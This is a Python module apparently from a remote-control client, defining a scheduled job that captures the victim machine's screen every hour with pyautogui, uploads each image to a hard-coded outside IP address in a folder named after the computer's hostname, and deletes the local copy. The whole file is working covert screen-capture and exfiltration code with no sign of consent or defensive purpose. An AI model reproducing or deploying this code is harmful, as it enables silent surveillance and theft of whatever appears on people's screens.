import os
import socket
import threading
import time

import pyautogui
import requests
import schedule

from client.util.modules.module import Module
from common.util import get_time


class ScreenshotJob(Module):
    def __init__(self):
        super().__init__()
        self.stop_event = threading.Event()

    def my_task(self):
        url = "http://123.249.102.1/file/upload"
        filename = 'screenshot_{}.png'.format(get_time())
        pyautogui.screenshot(filename)
        filename = os.path.abspath(filename)
        if not os.path.isfile(filename):
            print(f'File does not exist: {filename}')
        with open(filename, 'rb') as file:
            with requests.post(url, files={'files': file},
                               data={'currentDirectory': f'/public/{socket.gethostname()}/'}) as resp:
                print(resp.text)
        os.remove(filename)

    def run(self):
        try:
            self.status = True
            self.send_to_server(1, f'Scheduled job is on.', 1)
            # schedule.every(10).seconds.do(self.my_task)
            job = schedule.every().hour.at(":00").do(self.my_task)  # schedule.cancel_job(job)
            while not self.stop_event.is_set():
                schedule.run_pending()
                time.sleep(1)
        except Exception as e:
            self.send_to_server(0, f'Error occurs: {e}', 0)  # 如果服务器断开抛出异常将终止该线程
        self.send_to_server(1, f'Thread ended: {threading.current_thread().name}', 1)

    def stop(self):
        self.send_to_server(0, f'Trying to stop', 0)
        schedule.clear()
        self.stop_event.set()
        self.status = False
